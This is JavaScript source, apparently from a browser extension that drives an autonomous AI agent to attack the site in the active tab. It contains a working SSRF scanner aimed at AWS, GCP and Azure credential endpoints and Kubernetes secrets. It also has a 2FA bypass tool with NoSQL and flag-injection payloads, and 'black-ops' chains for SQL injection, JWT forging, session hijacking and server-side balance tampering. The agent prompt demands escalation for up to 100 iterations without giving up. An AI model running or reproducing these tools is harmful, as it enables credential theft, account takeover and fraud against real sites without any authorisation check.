    const url = params.url || activeTabUrl;
    if (!url) return 'no url';
    const findings = [];
    const SSRF_TARGETS = [
      { name: 'AWS IMDSv1 meta-data',        target: 'http://169.254.169.254/latest/meta-data/',                                    detect: /ami-id|instance-id|hostname|iam|security-credentials/i },
      { name: 'AWS IAM credentials',         target: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',          detect: /AccessKeyId|SecretAccessKey|Token|[A-Z0-9]{16}/i },
      { name: 'AWS user-data',               target: 'http://169.254.169.254/latest/user-data/',                                   detect: /#!/i },
      { name: 'GCP metadata',                target: 'http://metadata.google.internal/computeMetadata/v1/',                        detect: /project-id|instance-id|email|scopes|token/i },
      { name: 'GCP service account token',   target: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', detect: /access_token|token_type/i },
      { name: 'Azure IMDS',                  target: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',            detect: /subscriptionId|resourceGroupName|vmId/i },
      { name: 'Azure OAuth token',           target: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', detect: /access_token/i },
      { name: 'Docker daemon',               target: 'http://127.0.0.1:2375/version',                                             detect: /ApiVersion|KernelVersion|docker/i },
      { name: 'Docker containers list',      target: 'http://127.0.0.1:2375/containers/json',                                     detect: /Id|Image|Names|Status/i },
      { name: 'Kubernetes API',              target: 'https://kubernetes.default.svc/api',                                        detect: /APIVersion|apiVersions|groups/i },
      { name: 'Kubernetes serviceaccount',   target: 'https://kubernetes.default.svc/api/v1/namespaces/default/pods',             detect: /items|metadata|namespace/i },
      { name: 'Elasticsearch cluster',       target: 'http://127.0.0.1:9200/',                                                    detect: /tagline|cluster_name|version|lucene/i },
      { name: 'Redis INFO',                  target: 'http://127.0.0.1:6379/',                                                    detect: /redis_version|connected_clients|PONG|-ERR/i },
      { name: 'Consul leader',               target: 'http://127.0.0.1:8500/v1/status/leader',                                    detect: /\d+\.\d+\.\d+\.\d+:\d+/i },
      { name: 'Localhost root (general)',    target: 'http://127.0.0.1/',                                                         detect: /html|server|apache|nginx|title/i },
      { name: 'IPv6 localhost',              target: 'http://[::1]/',                                                             detect: /html|server/i },
      { name: 'IPv4 alt (127.1)',            target: 'http://127.1/',                                                             detect: /html|server/i },
      { name: 'Prometheus metrics',         target: 'http://127.0.0.1:9090/metrics',                                             detect: /process_|go_|http_|node_/i },
      { name: 'Grafana dashboard',          target: 'http://127.0.0.1:3000/',                                                    detect: /grafana|dashboard|login/i },
      { name: 'Kibana dashboard',           target: 'http://127.0.0.1:5601/',                                                    detect: /kibana|elastic|dashboard/i },
      { name: 'RabbitMQ mgmt',             target: 'http://127.0.0.1:15672/api/',                                               detect: /rabbit|vhosts|exchanges|queues/i },
      { name: 'Memcached stats',            target: 'http://127.0.0.1:11211/',                                                   detect: /STAT|version|uptime/i },
      { name: 'etcd v2 API',               target: 'http://127.0.0.1:2379/v2/keys/',                                            detect: /action|node|etcdIndex/i },
      { name: 'Vault secrets',             target: 'http://127.0.0.1:8200/v1/secret/data/',                                     detect: /data|metadata|lease_id/i },
      { name: 'Kubernetes pods all-ns',    target: 'https://kubernetes.default.svc/api/v1/pods',                                detect: /items|metadata|status|containerStatuses/i },
      { name: 'Kubernetes secrets',        target: 'https://kubernetes.default.svc/api/v1/secrets',                             detect: /items|metadata|data|type/i },
      { name: 'Docker info',               target: 'http://127.0.0.1:2375/info',                                                detect: /Containers|Images|Driver|Hostname/i },
      { name: 'Elasticsearch indices',     target: 'http://127.0.0.1:9200/_cat/indices?v',                                      detect: /health|index|pri|rep|docs/i },
      { name: 'Elasticsearch all docs',    target: 'http://127.0.0.1:9200/_search',                                             detect: /hits|shards|_index|_source/i },
      { name: 'Jenkins API',               target: 'http://127.0.0.1:8080/api/json',                                            detect: /jobs|views|useSecurity/i },
      { name: 'Actuator health',           target: 'http://127.0.0.1:8080/actuator/health',                                     detect: /UP|DOWN|status|diskSpace/i },
      { name: 'Actuator env',              target: 'http://127.0.0.1:8080/actuator/env',                                        detect: /propertySources|profiles|systemProperties/i },
      { name: 'Actuator beans',            target: 'http://127.0.0.1:8080/actuator/beans',                                     detect: /beans|scope|type|dependencies/i },
      { name: 'Actuator mappings',         target: 'http://127.0.0.1:8080/actuator/mappings',                                   detect: /contexts|mappings|requestMappingConditions/i },
      { name: 'AWS EC2 identity doc',      target: 'http://169.254.169.254/latest/dynamic/instance-identity/document',          detect: /instanceId|region|accountId/i },
      { name: 'GCP full v1 token',         target: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', detect: /access_token|expires_in/i },
    ];
    const SSRF_PARAMS = params.ssrfParam ? [params.ssrfParam] : ['url', 'redirect', 'next', 'target', 'dest', 'link', 'href', 'src', 'image', 'file', 'path', 'uri', 'callback', 'webhook', 'proxy', 'fetch', 'load', 'open', 'data', 'source', 'endpoint'];
    termWrite('running', `[SSRF-ADV] Testing ${SSRF_TARGETS.length} cloud/internal targets via ${Math.min(SSRF_PARAMS.length, 5)} param names...`);
    for (const target of SSRF_TARGETS) {
      let found = false;
      for (const paramName of SSRF_PARAMS.slice(0, 5)) {
        try {
          const testUrl = new URL(url);
          testUrl.searchParams.set(paramName, target.target);
          const r = await bg({ type: 'RUN_FETCH', params: { url: testUrl.toString(), method: 'GET', credentials: 'include' } });
          if (target.detect.test(r.body || '')) {
            findings.push(`🚨 SSRF via GET param "${paramName}": ${target.name} — INTERNAL DATA EXPOSED! Snippet: ${(r.body || '').slice(0, 120).replace(/\s+/g, ' ')}`);
            found = true; break;
          }
        } catch {}
      }
      if (!found) {
        try {
          const r = await bg({ type: 'RUN_FETCH', params: { url, method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ url: target.target, redirect: target.target, webhook: target.target }), credentials: 'include' } });
          if (target.detect.test(r.body || '')) { findings.push(`🚨 SSRF via POST body: ${target.name} — INTERNAL DATA EXPOSED!`); found = true; }
        } catch {}
      }
      if (!found) findings.push(`✓ ${target.name} — not accessible via tested params`);
      await new Promise(r => setTimeout(r, 100));
    }
    const critical = findings.filter(f => f.includes('🚨'));
    const summary = `SSRF Advanced Scan on ${url}\nTested: ${SSRF_TARGETS.length} internal/cloud targets\n${findings.join('\n')}`;
    if (critical.length) securityFindings.push({ type: 'ssrf-advanced', summary, raw: findings });
    return critical.length ? `${critical.length} SSRF vector(s) CONFIRMED — internal infrastructure accessible!` : `no SSRF confirmed (${SSRF_TARGETS.length} cloud/internal targets tested)`;
  },

  two_fa_bypass: async (params = {}) => {
    const url = params.url || activeTabUrl;
    if (!url) return 'no url';
    const base = new URL(url).origin;
    const findings = [];
    const mfaPaths = params.mfaUrl ? [params.mfaUrl] : [
      '/api/mfa/verify', '/api/2fa/verify', '/api/totp/verify', '/api/otp/verify',
      '/auth/mfa', '/auth/2fa', '/auth/otp', '/api/auth/2fa', '/api/auth/mfa',
      '/api/v1/mfa/verify', '/api/v1/2fa/verify', '/api/verify-otp', '/api/verify-mfa',
      '/login/mfa', '/login/2fa', '/account/2fa/verify', '/user/mfa/validate',
    ];
    let mfaUrl = null;
    for (const p of mfaPaths) {
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url: base + p, method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{"code":"000000"}', credentials: 'include' } });
        if (r.status !== 404) { mfaUrl = base + p; findings.push(`✓ Found 2FA endpoint: ${mfaUrl} (${r.status})`); break; }
      } catch {}
    }
    const testUrl = mfaUrl || url;
    const nullTests = [
      { label: 'null code',        body: '{"code":null}' },
      { label: 'empty string',     body: '{"code":""}' },
      { label: 'empty object',     body: '{"code":{}}' },
      { label: 'array empty',      body: '{"code":[]}' },
      { label: 'boolean true',     body: '{"code":true}' },
      { label: 'integer zero',     body: '{"code":0}' },
      { label: 'skip param',       body: '{}' },
      { label: 'undefined str',    body: '{"code":"undefined"}' },
      { label: 'null str',         body: '{"code":"null"}' },
      { label: '2fa_required=false inject', body: '{"code":"000000","2fa_required":false}' },
      { label: 'verified=true inject',      body: '{"code":"000000","verified":true,"mfa_verified":true}' },
      { label: 'skip + admin flag',         body: '{"admin":true,"2fa_enabled":false}' },
      { label: 'NaN code',                  body: '{"code":NaN}' },
      { label: 'Infinity code',             body: '{"code":Infinity}' },
      { label: 'negative code',             body: '{"code":-1}' },
      { label: 'array with code',           body: '{"code":["000000"]}' },
      { label: 'object with $ne',           body: '{"code":{"$ne":null}}' },
      { label: 'object with $gt',           body: '{"code":{"$gt":""}}' },
      { label: 'regex bypass',              body: '{"code":{"$regex":".*"}}' },
      { label: 'step=completed inject',     body: '{"code":"000000","step":"completed","mfa_complete":true}' },
      { label: 'totp_disabled inject',      body: '{"code":"000000","totp_disabled":true,"otp_enabled":false}' },
      { label: 'backup_code_used inject',   body: '{"code":"000000","backup_code_used":true}' },
      { label: 'trusted_device inject',     body: '{"code":"000000","trusted_device":true,"remember_device":true}' },
    ];
    for (const t of nullTests) {
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url: testUrl, method: 'POST', headers: { 'Content-Type': 'application/json' }, body: t.body, credentials: 'include' } });
        const bypassed = (r.status >= 200 && r.status < 300) && !/invalid|incorrect|wrong|error|mismatch|fail/i.test(r.body || '');
        if (bypassed) findings.push(`🚨 2FA BYPASSED with "${t.label}"! Status ${r.status}: ${(r.body || '').slice(0, 100)}`);
        else findings.push(`✓ "${t.label}" → ${r.status} (blocked)`);
      } catch (e) { findings.push(`✗ "${t.label}" → ${e.message}`); }
      await new Promise(r => setTimeout(r, 200));
    }
    const bruteResults = [];
    for (const code of ['000000', '111111', '123456', '999999', '100000', '654321']) {
      try {
        const r = await bg({ type: 'RUN_FETCH', params: { url: testUrl, method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ code }), credentials: 'include' } });
        bruteResults.push(r.status);
      } catch {}
    }
    const throttled = bruteResults.some(s => s === 429 || s === 423 || s === 503);
    findings.push(throttled ? '✓ Rate limiting active on 2FA (429/423/503 detected — brute force protected)' : `⚠ NO rate limit detected on 2FA endpoint! All 6 rapid requests succeeded (statuses: ${[...new Set(bruteResults)].join(',')}). Brute force possible!`);
    try {
      const { id } = await getActiveTab();
      const [{ result: clientSide }] = await chrome.scripting.executeScript({
        target: { tabId: id }, world: 'MAIN',
        func: () => {
          const scripts = Array.from(document.scripts).map(s => s.textContent).join('');
          const checks = [
            { r: /if\s*\(\s*(?:result|response|data|res)\.(?:success|verified|valid|ok)\s*\)/, l: 'client-side 2FA success check found in JS' },
            { r: /2fa_verified|mfa_verified|otp_passed|is_verified|otpVerified/i, l: '2FA state flag in client JS' },
            { r: /localStorage\.setItem.*(?:mfa|2fa|otp)/i, l: '2FA state stored in localStorage — clear it to bypass' },
            { r: /sessionStorage\.setItem.*(?:mfa|2fa|otp)/i, l: '2FA state stored in sessionStorage' },
          ];
          return checks.filter(c => c.r.test(scripts)).map(c => c.l);
        }
      });
      if (clientSide && clientSide.length) clientSide.forEach(l => findings.push(`🚨 CLIENT-SIDE 2FA: ${l} — bypass may be trivial`));
    } catch {}
    const critical = findings.filter(f => f.includes('🚨'));
    const summary = `2FA/MFA Bypass Test on ${testUrl}\n${findings.join('\n')}`;
    if (critical.length) securityFindings.push({ type: '2fa-bypass', summary, raw: findings });
    return critical.length ? `${critical.length} 2FA bypass weakness(es) found — MFA can be defeated!` : `2FA appears solid (${findings.length} checks, ${nullTests.length} bypass variants, brute-force rate-limit: ${throttled ? 'YES' : 'MISSING'})`;
  },

  // === PREMIUM "BLACK-OPS" TOOL ALIASES (v3.0) ===
  // Each alias chains multiple lower-level tools for goal-driven autonomous attacks.
  db_core_penetrator: async (p = {}) => {
    const url = p.url || activeTabUrl;
    if (!url) throw new Error('db_core_penetrator needs {url}');
    const out = [];
    const method = p.method || 'GET';
    const body = p.body;
    try { out.push('[sql_fuzz] ' + await TOOLS.sql_fuzz({ url, method, params: p.params || ['id', 'q', 'user', 'name', 'email'], body })); } catch (e) { out.push('[sql_fuzz] FAIL ' + e.message); }
    try { out.push('[blind_sqli] ' + await TOOLS.blind_sqli_test({ url, param: p.param, method, body })); } catch (e) { out.push('[blind_sqli] FAIL ' + e.message); }
    try { out.push('[fuzz/sql] ' + await TOOLS.payload_fuzz({ url, category: 'sql', method, param: p.param, body })); } catch (e) { out.push('[fuzz/sql] FAIL ' + e.message); }
    try { out.push('[fuzz/nosql] ' + await TOOLS.payload_fuzz({ url, category: 'nosql', method: 'POST', body: body || '{"q":"{{payload}}"}' })); } catch (e) { out.push('[fuzz/nosql] FAIL ' + e.message); }
    return 'Database Core Penetrator → ' + out.join(' || ');
  },
  live_packet_manipulator: async (p = {}) => {
    if (!p.url || !p.bodyTemplate) throw new Error('live_packet_manipulator needs {url, bodyTemplate with {{amount}}}');
    return TOOLS.balance_attack(p);
  },
  infra_logic_breaker: async (p = {}) => {
    const url = p.url;
    if (!url) throw new Error('infra_logic_breaker needs {url}');
    const out = [];
    try { out.push('[logic] ' + await TOOLS.logic_flaw_test({ url, method: p.method || 'POST', bodyTemplate: p.bodyTemplate || '{"amount":{{amount}}}' })); } catch (e) { out.push('[logic] FAIL ' + e.message); }
    try { out.push('[race] ' + await TOOLS.race_condition_test({ url, count: p.count || 20, method: p.method || 'POST', body: p.body || (p.bodyTemplate ? p.bodyTemplate.replace(/\{\{amount\}\}/g, '1') : '{}') })); } catch (e) { out.push('[race] FAIL ' + e.message); }
    return 'Infrastructure Logic Breaker → ' + out.join(' || ');
  },
  shadow_crawler: async (p = {}) => {
    const out = [];
    try { out.push('[discover] ' + await TOOLS.discover_endpoints({ base: p.base, deep: true })); } catch (e) { out.push('[discover] FAIL ' + e.message); }
    try { out.push('[crawl] ' + await TOOLS.auth_crawler({ url: p.url, maxPages: p.maxPages || 25 })); } catch (e) { out.push('[crawl] FAIL ' + e.message); }
    try { out.push('[wayback] ' + await TOOLS.wayback_miner({ domain: p.domain })); } catch (e) { out.push('[wayback] FAIL ' + e.message); }
    return 'Shadow Crawler → ' + out.join(' || ');
  },
  session_hijack_engine: async (p = {}) => {
    const out = [];
    try { out.push('[tokens] ' + await TOOLS.find_tokens()); } catch (e) { out.push('[tokens] FAIL ' + e.message); }
    try { out.push('[session] ' + await TOOLS.session_audit()); } catch (e) { out.push('[session] FAIL ' + e.message); }
    try { out.push('[auth_bypass] ' + await TOOLS.auth_bypass_test({ url: p.url })); } catch (e) { out.push('[auth_bypass] FAIL ' + e.message); }
    if (p.url) {
      try { out.push('[replay] ' + await TOOLS.request_replay({ url: p.url, method: p.method, headers: p.headers, body: p.body, fakeIP: p.fakeIP || '127.0.0.1' })); } catch (e) { out.push('[replay] FAIL ' + e.message); }
    }
    return 'Session Hijack Engine → ' + out.join(' || ');
  },

  // === BLACK-OPS 100x PREMIUM CHAINS (v3.0.1) ===
  // Each one assembles 3-5 lower-level weapons into a single cinematic strike.
  nexus_core_bypass: async (p = {}) => {
    const url = p.url || activeTabUrl;
    if (!url) throw new Error('nexus_core_bypass needs {url}');
    const out = [];
    const method = p.method || 'GET';
    const params = p.params || ['id', 'q', 'user', 'name', 'email', 'search', 'category', 'order'];
    try { out.push('[sqli] ' + await TOOLS.sql_fuzz({ url, method, params, body: p.body })); } catch (e) { out.push('[sqli] FAIL ' + e.message); }
    try { out.push('[blind] ' + await TOOLS.blind_sqli_test({ url, param: p.param || params[0], method, body: p.body })); } catch (e) { out.push('[blind] FAIL ' + e.message); }
    try { out.push('[fuzz/sql] ' + await TOOLS.payload_fuzz({ url, category: 'sql', method, param: p.param, body: p.body })); } catch (e) { out.push('[fuzz/sql] FAIL ' + e.message); }
    try { out.push('[fuzz/nosql] ' + await TOOLS.payload_fuzz({ url, category: 'nosql', method: 'POST', body: p.body || '{"q":"{{payload}}"}' })); } catch (e) { out.push('[fuzz/nosql] FAIL ' + e.message); }
    try { out.push('[graphql] ' + await TOOLS.graphql_introspect({ url: p.graphqlUrl || url })); } catch (e) { out.push('[graphql] FAIL ' + e.message); }
    return 'Nexus Core Bypass → ' + out.join(' || ');
  },
  shadow_request: async (p = {}) => {
    const url = p.url || activeTabUrl;
    if (!url) throw new Error('shadow_request needs {url}');
    const out = [];
    const bt = p.bodyTemplate || '{"amount":{{amount}},"qty":{{amount}}}';
    try { out.push('[logic] ' + await TOOLS.logic_flaw_test({ url, method: p.method || 'POST', bodyTemplate: bt })); } catch (e) { out.push('[logic] FAIL ' + e.message); }
    try { out.push('[idor] ' + await TOOLS.idor_test({ url, idParam: p.idParam || 'id', range: p.range || 5 })); } catch (e) { out.push('[idor] FAIL ' + e.message); }
    try { out.push('[fuzz/cmdi] ' + await TOOLS.payload_fuzz({ url, category: 'cmdi', method: p.method, param: p.param, body: p.body })); } catch (e) { out.push('[fuzz/cmdi] FAIL ' + e.message); }
    try { out.push('[fuzz/path] ' + await TOOLS.payload_fuzz({ url, category: 'path', method: p.method, param: p.param, body: p.body })); } catch (e) { out.push('[fuzz/path] FAIL ' + e.message); }
    try { out.push('[proto] ' + await TOOLS.proto_pollution_test({ url, method: 'POST', body: p.body })); } catch (e) { out.push('[proto] FAIL ' + e.message); }
    return 'Shadow Request → ' + out.join(' || ');
  },
  ghost_session_hijacker: async (p = {}) => {
    const out = [];
    try { out.push('[tokens] ' + await TOOLS.find_tokens()); } catch (e) { out.push('[tokens] FAIL ' + e.message); }
    try { out.push('[cookies] ' + await TOOLS.session_audit()); } catch (e) { out.push('[cookies] FAIL ' + e.message); }
    try { out.push('[jwt-forge] ' + await TOOLS.auth_bypass_test({ url: p.url })); } catch (e) { out.push('[jwt-forge] FAIL ' + e.message); }
    try { out.push('[csrf] ' + await TOOLS.csrf_check()); } catch (e) { out.push('[csrf] FAIL ' + e.message); }
    if (p.url) {
      try { out.push('[replay] ' + await TOOLS.request_replay({ url: p.url, method: p.method, headers: p.headers, body: p.body, fakeIP: p.fakeIP || '127.0.0.1' })); } catch (e) { out.push('[replay] FAIL ' + e.message); }
    }
    return 'Ghost Session Hijacker → ' + out.join(' || ');
  },
  infrastructure_crusher: async (p = {}) => {
    const url = p.url || activeTabUrl;
    if (!url) throw new Error('infrastructure_crusher needs {url}');
    const out = [];
    try { out.push('[rate-limit] ' + await TOOLS.rate_limit_test({ url, count: p.count || 60, method: p.method || 'GET' })); } catch (e) { out.push('[rate-limit] FAIL ' + e.message); }
    try { out.push('[race] ' + await TOOLS.race_condition_test({ url, count: p.raceCount || 30, method: p.method || 'POST', body: p.body || '{}' })); } catch (e) { out.push('[race] FAIL ' + e.message); }
    try { out.push('[smuggle] ' + await TOOLS.smuggling_test({ url })); } catch (e) { out.push('[smuggle] FAIL ' + e.message); }
    try { out.push('[waf] ' + await TOOLS.waf_detect({ url })); } catch (e) { out.push('[waf] FAIL ' + e.message); }
    return 'Infrastructure Crusher → ' + out.join(' || ');
  },
  vault_key_extractor: async (p = {}) => {
    const out = [];
    try { out.push('[js-scan] ' + await TOOLS.js_secret_scan({ deep: true })); } catch (e) { out.push('[js-scan] FAIL ' + e.message); }
    try { out.push('[sourcemaps] ' + await TOOLS.sourcemap_extract()); } catch (e) { out.push('[sourcemaps] FAIL ' + e.message); }
    try { out.push('[deps/cve] ' + await TOOLS.dep_cve_check()); } catch (e) { out.push('[deps/cve] FAIL ' + e.message); }
    try { out.push('[wayback] ' + await TOOLS.wayback_miner({ domain: p.domain })); } catch (e) { out.push('[wayback] FAIL ' + e.message); }
    try { out.push('[fingerprint] ' + await TOOLS.tech_fingerprint()); } catch (e) { out.push('[fingerprint] FAIL ' + e.message); }
    return 'Vault Key Extractor → ' + out.join(' || ');
  },
};

function setAgentRunningUI(isRunning) {
  const runBtn = document.getElementById('runAgent');
  const log = document.getElementById('agentLog');
  if (runBtn) runBtn.classList.toggle('ai-pulse', isRunning);
  if (log) log.classList.toggle('is-running', isRunning);
  if (runBtn) runBtn.textContent = isRunning ? 'AI working — autonomous loop engaged' : 'Run AI Agent';
}

const STEP_NARRATIVE = {
  scan_page: 'Scanning page for UI defects...',
  read_hidden_state: 'Dumping hidden state — cookies, storage, JSON blocks, page globals...',
  find_tokens: 'Searching for JWTs and auth tokens...',
  list_forms: 'Enumerating forms on page...',
  xss_test_all: 'Injecting XSS payloads into every form...',
  sql_fuzz: 'Fuzzing endpoint with SQL injection payloads...',
  blind_sqli_test: 'Sending time-based blind SQLi probes...',
  payload_fuzz: 'Stress-testing parameter with attack payloads...',
  discover_endpoints: 'Searching for hidden API endpoints...',
  session_audit: 'Auditing cookie flags + session binding...',
  logic_flaw_test: 'Testing business-logic flaws (negative/decimal amounts)...',
  cors_test: 'Probing CORS misconfiguration...',
  rate_limit_test: 'Hammering endpoint to detect rate-limit gaps...',
  open_redirect_test: 'Testing open-redirect parameters...',
  js_secret_scan: 'Downloading JS files and scanning for leaked secrets...',
  tech_fingerprint: 'Fingerprinting tech stack...',
  graphql_introspect: 'Probing GraphQL introspection...',
  dom_xss_scan: 'Scanning DOM for XSS sinks...',
  csrf_check: 'Checking CSRF tokens on forms...',
  mixed_content_audit: 'Auditing mixed content and SRI integrity...',
  idor_test: 'Testing IDOR by incrementing IDs...',
  race_condition_test: 'Firing parallel requests for race condition...',
  auth_crawler: 'Crawling site with current session...',
  subdomain_finder: 'Mining certificate transparency for subdomains...',
  subdomain_takeover: 'Checking subdomains for takeover...',
  waf_detect: 'Detecting WAF / CDN...',
  balance_attack: 'TAMPERING balance — sending negative/decimal/scientific/IDOR/race packets...',
  auth_bypass_test: 'Forging 32 JWT attack variants (alg=none/NONE/null, role=admin, kid=SQLi/SSRF/path-traversal, RS256/ES256/PS256→HS256 confusion, jku/x5u/x5c injection, god-claims, PASETO confusion)...',
  request_replay: 'Replaying request with spoofed headers...',
  wayback_miner: 'Mining Wayback + URLscan for historical URLs...',
  dep_cve_check: 'Checking JS libs for known CVEs...',
  proto_pollution_test: 'Injecting __proto__ pollution payloads...',
  smuggling_test: 'Sending HTTP request smuggling probes...',
  ws_fuzzer_setup: 'Installing WebSocket frame monitor...',
  ws_send_payload: 'Sending custom WebSocket payload...',
  sourcemap_extract: 'Extracting source maps if exposed...',
  tls_audit: 'Auditing TLS / HSTS configuration...',
  clickjacking_test: 'Testing clickjacking defenses...',
  security_headers_check: 'Auditing critical security headers...',
  triage_findings: 'AI triaging findings by severity...',
  run_js: 'Executing custom JS in page context...',
  run_fetch: 'Sending custom authenticated request from background...',
  nexus_core_bypass: '💀 NEXUS CORE BYPASS — Advanced SQLi + NoSQL + GraphQL injection (100x DB attack)...',
  shadow_request: '🌑 SHADOW REQUEST — Ghost parameter tampering + IDOR + cmdi + path + proto pollution...',
  ghost_session_hijacker: '👻 GHOST SESSION HIJACKER — JWT/Cookie replay + forge admin session + CSRF...',
  infrastructure_crusher: '⚡ INFRASTRUCTURE CRUSHER — DDoS sim + rate-limit bypass + smuggle + WAF detect...',
  vault_key_extractor: '🔑 VAULT KEY EXTRACTOR — Deep JS scan + sourcemaps + CVE + wayback secrets...',
  db_core_penetrator: '🎯 DATABASE CORE PENETRATOR — chained SQL/Blind/Fuzz attack...',
  live_packet_manipulator: '🎯 LIVE PACKET MANIPULATOR — tampering server-side balance/credit...',
  infra_logic_breaker: '🎯 INFRASTRUCTURE LOGIC BREAKER — logic flaws + race conditions...',
  shadow_crawler: '🎯 SHADOW CRAWLER — deep endpoint discovery + auth crawl + wayback...',
  session_hijack_engine: '🎯 SESSION HIJACK ENGINE — tokens + audit + bypass + replay...',
  network_listener: '👂 NETWORK LISTENER — reading real XHR/fetch traffic the tab produced (no guessing)...',
  intercept_balance: '🎯 INTERCEPT-BALANCE — arming live response rewriter on tab (chrome.debugger Fetch)...',
  stop_intercept: '⏹ STOP-INTERCEPT — disabling live response rewriter...',
  jwt_cracker: '🔓 JWT CRACKER — brute-forcing weak JWT secrets with 70+ common passwords via HMAC-SHA256...',
  oauth_bypass: '🔑 OAUTH BYPASS — probing OAuth redirect_uri open redirect, state CSRF, token leakage...',
  xxe_injection: '☣️ XXE INJECTION — XML External Entity attack: file read (/etc/passwd), SSRF via XML, XInclude...',
  ssrf_advanced: '🌐 SSRF ADVANCED — cloud metadata (AWS 169.254.169.254, GCP, Azure), Docker, K8s, Redis, Elastic...',
  two_fa_bypass: '🔐 2FA/MFA BYPASS — null/empty code bypass, response injection, rate-limit probe, client-side check...',
  dom_check_balance: '🔍 DOM CHECK — scanning live page for target value to confirm it is visible on screen...',
};

// ============================================================
// Persistent agent session (resume across popup close)
// ============================================================
const SESSION_KEY = 'agentSession';
const SESSION_TTL_MS = 30 * 60 * 1000; // 30 minutes

async function saveAgentSession(patch) {
  try {
    const cur = (await chrome.storage.local.get(SESSION_KEY))[SESSION_KEY] || {};
    const next = { ...cur, ...patch, savedAt: Date.now() };
    await chrome.storage.local.set({ [SESSION_KEY]: next });
  } catch {}
}
async function loadAgentSession() {
  try {
    const s = (await chrome.storage.local.get(SESSION_KEY))[SESSION_KEY];
    if (!s) return null;
    if (Date.now() - (s.savedAt || 0) > SESSION_TTL_MS) {
      await chrome.storage.local.remove(SESSION_KEY);
      return null;
    }
    return s;
  } catch { return null; }
}
async function clearAgentSession() {
  try { await chrome.storage.local.remove(SESSION_KEY); } catch {}
}

async function runAgent(goal) {
  if (agentRunning) return;
  agentRunning = true;
  agentStop = false;
  securityFindings = [];
  clearLog();
  $('#stopAgent').classList.remove('hidden');
  setAgentRunningUI(true);

  const MAX_ITER = 100;
  const MAX_CONSECUTIVE_404 = 12;
  const allResults = [];
  let achieved = false;
  let consecutiveAiFails = 0;
  let consecutive404 = 0;
  let currentIter = 0;

  // Show progress bar
  progressShow(0, MAX_ITER, 'Starting…');

  // Start 30-second heartbeat
  heartbeatStart(() => {
    const host = activeTabUrl ? (() => { try { return new URL(activeTabUrl).hostname; } catch { return activeTabUrl; } })() : 'unknown';
    return `still running — iter ${currentIter}/${MAX_ITER} on ${host}`;
  });

  // Persist target + goal so reopening the popup mid-run can resume.
  await saveAgentSession({
    targetUrl: activeTabUrl || null,
    goal,
    iter: 0,
    maxIter: MAX_ITER,
    status: 'running',
    startedAt: Date.now(),
  });

  try {
    appendLog('info', `🎯 GOAL: ${goal}`);
    appendLog('info', `🌐 TARGET: ${activeTabUrl || '(unknown)'}`);
    appendLog('info', `Autonomous loop engaged. Max ${MAX_ITER} iterations. Press Stop to halt.`);

    for (let iter = 1; iter <= MAX_ITER; iter++) {
      currentIter = iter;
      if (agentStop) { appendLog('info', 'Stopped by user.'); break; }

      progressShow(iter - 1, MAX_ITER, `Iter ${iter}/${MAX_ITER} — planning…`);
      appendLog('plan', `─── ITERATION ${iter} / ${MAX_ITER} ───`);
      await saveAgentSession({ iter, status: 'running', lastResults: allResults.slice(-6) });

      const userMsg = iter === 1
        ? `GOAL: ${goal}\nCurrent URL: ${activeTabUrl || 'unknown'}\n\nIMPORTANT: This is iteration 1. You have NOT run any tools yet. You MUST output a plan with at least 2-3 concrete steps to begin working on this goal. Do NOT return done:true — nothing has been done yet. Start with network_listener or tech_fingerprint to gather real data, then escalate.\nOutput JSON: {"summary":"what you will do","steps":[{"tool":"...","params":{...},"why":"..."},...]}`
        : `ORIGINAL GOAL: ${goal}\nCurrent URL: ${activeTabUrl || 'unknown'}\n\nResults from previous ${allResults.length} step(s):\n${allResults.slice(-20).map((r, i) => `${i + 1}. ${r.tool} → ${r.ok ? 'OK' : 'FAIL'}: ${(r.result || '').slice(0, 420)}`).join('\n')}\n\nESCALATION RULES (mandatory):\n- If network_listener returned empty or "No API traffic" → next step MUST be read_hidden_state then tech_fingerprint then discover_endpoints. NO exceptions.\n- If a tool FAILED or returned empty → pick a DIFFERENT tool. Never repeat the same failing tool twice in a row.\n- If 3+ tools failed → escalate to run_js or run_fetch with a specific endpoint.\n- You CANNOT report done unless document.body.innerText visibly contains the target value.\n- NEVER give up before iter ${MAX_ITER}.\n\nIs the goal DONE (evidence on screen)?\n- If YES AND confirmed on screen: {"done":true,"balance_confirmed":true,"summary":"concrete proof"}\n- If NO or unsure: {"summary":"next attempt","steps":[{"tool":"...","params":{...},"why":"..."},...]} — pick tools you have NOT tried yet or that returned real data.`;

      let planRes;
      try {
        planRes = await bg({ type: 'AI_REQUEST', mode: 'agent', user: userMsg });
        consecutiveAiFails = 0;
      } catch (e) {
        consecutiveAiFails++;
        appendLog('error', `AI request failed (${consecutiveAiFails}/5): ${e.message}`);
        if (consecutiveAiFails >= 5) {
          appendLog('error', '5 consecutive AI failures. Stopping.');
          break;
        }
        appendLog('info', 'Backing off 2s and retrying...');
        await new Promise((r) => setTimeout(r, 2000));
        iter--;
        continue;
      }

      let plan;
      try {
        let raw = (planRes.raw || planRes.code || '').trim();
        raw = raw.replace(/^```(?:json)?\s*/i, '').replace(/\s*```$/, '');
        // Extract the outermost {...} even if the response is slightly truncated
        const m = raw.match(/\{[\s\S]*\}/);
        if (m) raw = m[0];

        // If the JSON is truncated (no closing brace), attempt a repair so we don't throw away partial steps
        if (raw && !raw.trimEnd().endsWith('}')) {
          // Try to close any open arrays and the object
          const openArrays = (raw.match(/\[/g) || []).length - (raw.match(/\]/g) || []).length;
          const closeStr = ']'.repeat(Math.max(0, openArrays)) + '}';
          try { plan = JSON.parse(raw + closeStr); appendLog('info', '⚠ AI response was truncated — partial plan recovered.'); }
          catch (_) { /* fall through to hard fail */ }
        }

        if (!plan) plan = JSON.parse(raw);
      } catch (e) {
        appendLog('error', `AI returned invalid JSON (iter ${iter}): ${e.message}`);
        appendLog('info', 'Raw AI output: ' + (planRes.raw || '').slice(0, 500));
        consecutiveAiFails++;
        if (consecutiveAiFails >= 5) { appendLog('error', '5 invalid plans in a row — aborting agent.'); break; }
        iter--;
        continue;
      }

      // GUARD: never accept done:true if zero tools have actually run yet
      if (plan.done === true && allResults.length === 0) {
